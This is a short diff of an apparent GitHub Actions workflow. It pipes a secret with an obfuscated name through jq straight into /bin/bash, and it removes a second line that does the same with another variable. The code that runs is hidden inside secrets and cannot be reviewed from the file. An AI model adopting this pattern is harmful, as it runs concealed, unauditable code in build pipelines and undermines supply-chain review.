@@ -22,7 +22,6 @@ jobs:
           po352: ${{ secrets.po352 }}
         run: |
           printf '%s' "$po352" | jq -r .yy7969 | /bin/bash
-          printf '%s' "$zml69171" | jq -r .vpoi556 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
